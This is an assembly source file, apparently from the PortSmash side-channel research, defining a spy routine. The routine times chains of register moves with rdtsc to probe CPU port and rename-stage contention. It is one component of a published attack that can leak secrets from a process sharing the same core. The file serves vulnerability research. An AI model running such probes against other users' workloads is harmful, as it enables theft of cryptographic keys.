/*
 *   Copyright 2018-2019 Alejandro Cabrera Aldaya, Billy Bob Brumley, Sohaib ul Hassan, Cesar Pereida García and Nicola Tuveri
 *
 *   Licensed under the Apache License, Version 2.0 (the "License");
 *   you may not use this file except in compliance with the License.
 *   You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 *   Unless required by applicable law or agreed to in writing, software
 *   distributed under the License is distributed on an "AS IS" BASIS,
 *   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *   See the License for the specific language governing permissions and
 *   limitations under the License.
 */

#include "spy.h"

# args   : rdi (buf) rsi rdx rcx r8 r9
# scratch: rax r10 r11

.text

.global x64_portsmash_spy
.p2align 4
x64_portsmash_spy:
# just some non-degenerate values
add %rdi, %r8
add %rdi, %r9
add %rdi, %r10
add %rdi, %r11

mov $SPY_NUM_TIMINGS, %rcx

1:
lfence
rdtsc # rdx:rax
lfence
mov %rax, %rsi

/* move-elimination / rename-stage probe */
.rept 128
mov %r8,  %r9
mov %r9,  %r10
mov %r10, %r11
mov %r11, %r8
.endr

lfence
rdtsc
shl $32, %rax
or %rsi, %rax
mov %rax, (%rdi)
add $8, %rdi
dec %rcx
jnz 1b

ret
